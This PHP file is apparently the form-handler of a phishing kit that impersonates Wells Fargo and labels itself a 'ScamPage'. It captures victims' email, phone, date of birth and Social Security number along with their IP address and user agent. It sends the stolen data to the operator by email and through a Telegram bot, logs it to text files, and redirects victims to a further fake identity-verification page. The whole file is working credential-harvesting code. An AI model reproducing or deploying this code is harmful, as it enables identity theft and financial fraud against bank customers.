<?php 

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
		if ( isset( $_POST['email'] ) ) {
		
		$_SESSION['email'] 	  = $_POST['email'];
	    $_SESSION['phone'] 	  = $_POST['phone'];
		$_SESSION['phoneType'] 	  = $_POST['phoneType'];
		$_SESSION['date'] 	  = $_POST['date'];
		$_SESSION['ssn'] 	  = $_POST['ssn'];
		
		$code = <<<EOT
»»————-　★[ ⚫️🌀 WELLSFARGO Email & SSN & DOB Info ⚫️🌀 ]★　————-««

[EMAIL ADDRESS] 		: {$_SESSION['email']}
[PHONE NUMBER]		: {$_SESSION['phone']}
[DATE OF BIRTH] 		: {$_SESSION['date']}
[SOCIAL SECURITY/ITIN] 		: {$_SESSION['ssn']}
[PHONE TYPE] 		: {$_SESSION['phoneType']}
»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
		
		if ($sendtoemail=="yes"){
		$subject = "🏛️ WELLSFARGO Billing 🏛️  From $ip";
        $headers = "From: 🍁WELLSFARGO Email & SSN & DOB Info🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}
		
		
		if ($saveintotxt=="yes"){
		$save = fopen("../Logs/SSN&DOB.txt","a+");
        fwrite($save,$code);
        fclose($save);
		}
		
	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}


		$save = fopen("../Logs/Billing.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../personal_identity?oamo/identity/recognizeUser/requestidentification");
        exit();
	} else {
		header("Location: ../index?");
		exit();
	}
?>
